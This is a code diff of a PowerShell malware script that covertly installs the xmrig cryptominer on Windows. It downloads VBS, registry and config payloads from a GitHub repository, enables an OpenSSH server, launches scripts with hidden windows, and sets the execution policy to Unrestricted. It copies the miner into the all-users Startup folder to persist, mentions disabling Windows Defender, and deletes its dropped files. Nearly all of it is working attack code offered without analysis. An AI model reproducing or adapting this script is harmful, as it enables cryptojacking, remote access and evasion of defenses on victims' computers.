@@ -54,7 +54,7 @@ cd $path
 Invoke-WebRequest -OutFile "QyjAaZDBbNPk.reg" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg"
 Invoke-WebRequest -OutFile "FoRAUwtxKkSB.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs"
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat" -OutFile "w.bat"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/config.json" -OutFile "config.json"
 
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
@@ -75,8 +75,8 @@ Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.co
 
 # Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
-# Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-# Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
+# Set-Variable -Name newConfigPath -Value ("$path\config.json")
+# Set-Variable -Value ("$initial_dir\xmrig-6.22.2\config.json") -Name targetConfigPath
 # if (Test-Path -Path $newConfigPath) {
 #     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
 #     Write-Output "bat file has been copied successfully."
@@ -105,11 +105,11 @@ Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "
 cd $initial_dir
 Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"
 
-#Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -FilePath "cscript.exe"
+#Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\config.json" -FilePath "cscript.exe"
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 #cd "$initial_dir\xmrig-6.22.2"
-#Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
+#Start-Process -FilePath ".\config.json" -NoNewWindow -Wait
 #Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait
 
 #Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
@@ -120,7 +120,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Define hidden payload path
 $hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 #$payloadName = "svchost.exe"
-$destinationPath = "$hiddenDir\xmrig-6.22.2\w.bat"#Join-Path $hiddenDir $payloadName
+$destinationPath = "$hiddenDir\xmrig-6.22.2\xmrig.exe"  #Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 
 # mkdir "$hiddenDir\xmrig-6.22.2"
@@ -134,8 +134,8 @@ if (-not (Test-Path $hiddenDir)) {
 
 # Copy miner to hidden location
 #Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
-Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-Set-Variable -Value ("$hiddenDir\xmrig-6.22.2\w.bat") -Name targetConfigPath
+Set-Variable -Name newConfigPath -Value ("$path\config.json")
+Set-Variable -Value ("$hiddenDir\xmrig-6.22.2\config.json") -Name targetConfigPath
 if (Test-Path -Path $newConfigPath) {
     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
     Write-Output "bat file has been copied successfully."
@@ -143,7 +143,7 @@ if (Test-Path -Path $newConfigPath) {
     Write-Output "New bat file not found at the specified path."
 }
 
-Remove-Item -Path "$hiddenDir\xmrig-6.22.2\config.json"
+#Remove-Item -Path "$hiddenDir\xmrig-6.22.2\config.json"
 # Rename-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe" -NewName "xmrig-6.22.2.exe"
 Start-Sleep -Seconds 45
 # Disable Windows Defender temporarily
@@ -265,5 +265,5 @@ Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
-Remove-Item -Path "$path\w.bat"
+Remove-Item -Path "$path\config.json"
 # Remove-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe"
